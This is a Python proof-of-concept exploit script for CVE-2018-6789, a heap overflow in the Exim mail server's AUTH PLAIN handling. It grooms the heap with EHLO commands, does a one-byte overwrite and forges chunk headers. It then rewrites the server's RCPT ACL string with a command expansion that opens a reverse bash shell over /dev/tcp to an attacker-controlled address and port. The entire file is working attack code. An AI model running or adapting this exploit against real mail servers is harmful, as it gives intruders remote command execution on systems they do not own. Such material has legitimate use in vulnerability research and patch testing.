#!/usr/bin/python
import time
import socket
import struct
s = None
f = None
def logo():
   print
   print "        CVE-2018-6789 Poc Exploit"
   print "@straight_blast ; straightblast426@gmail.com"
   print
def connect(host, port):
   global s
   global f
   s = socket.create_connection((host,port))
   f = s.makefile('rw', bufsize=0)
def p(v):
   return struct.pack("<Q", v)
def readuntil(delim='\n'):
   data = ''
   while not data.endswith(delim):
      data += f.read(1)
   return data
def write(data):
   f.write(data + "\n")
def ehlo(v):
   write("EHLO " + v)
   readuntil('HELP')
def unrec(v):
   write(v)
   readuntil('command')
def auth_plain(v):
   encode = v.encode('base64').replace('\n','').replace('=','')
   write("AUTH PLAIN " + encode)
   readuntil('data')
def one_byte_overwrite():
   v = "C" * 8200
   encode = v.encode('base64').replace('\n','').replace('=','')
   encode = encode[:-1] + "PE"
   write("AUTH PLAIN " + encode)
   readuntil('data')
def exploit():
   logo()
   connect('localhost', 25)
   print "[1] connected to target"
   time.sleep(0.5)   
   
   ehlo("A" * 8000)     
   ehlo("B" * 16)
   print "[2] created free chunk size 0x6060 in unsorted bin"
   
   unrec("\xff" * 2000)
   ehlo("D" * 8200)
   one_byte_overwrite()
   print "[3] triggered 1 byte overwrite to extend target chunk size from 0x2020 to 0x20f0"
   
   fake_header  = p(0) 
   fake_header += p(0x1f51)
   auth_plain("E" * 176 + fake_header + "E" * (8200-176-len(fake_header)))
   print "[4] patched chunk with fake header so extended chunk can be freed"
   
   ehlo("F" * 16)
   print "[5] freed extended chunk"
   
   unrec("\xff" * 2000)
   unrec("\xff" * 2000)
   print "[6] occupied 1st and 3rd item in unsorted bin with fillers"
   
   fake_header  = p(0x4110)
   fake_header += p(0x1f50)   
   auth_plain("G" * 176 + fake_header + "G" * (8200-176-len(fake_header)))
   print "[7] patched chunk with fake header so extended chunk can be allocated"
   
   address = 0x55d7e5864480
   auth_plain("H" * 8200 + p(0x2021) + p(address)  + p(0x2008) + "H" * 184)
   print "[8] overwrite 'next' pointer with ACL store block address"
   
   ehlo("I" * 16)
   print "[9] freed the ACL store block"
   
   acl_smtp_rcpt_offset = 288
   local_host = '192.168.0.159'
   local_port = 1337
   cmd = "/bin/bash -c \"/bin/bash -i >& /dev/tcp/" + local_host + "/" + str(local_port) + " 0>&1\""
   cmd_expansion_string = "${run{" + cmd + "}}\0"
   auth_plain("J" * acl_smtp_rcpt_offset + cmd_expansion_string + "J" * (8200 - acl_smtp_rcpt_offset - len(cmd_expansion_string))) 
   print "[10] malloced ACL store block and overwrite the content of 'acl_smtp_rcpt' with shell expression"

   write("MAIL FROM:<test@pwned.com>")
   readuntil("OK")
   write("RCPT TO:<shell@pwned.com>")   
   print "[11] triggered RCPT TO and executing shell expression ... enjoy your shell!"
   print
if __name__ == '__main__':
   exploit()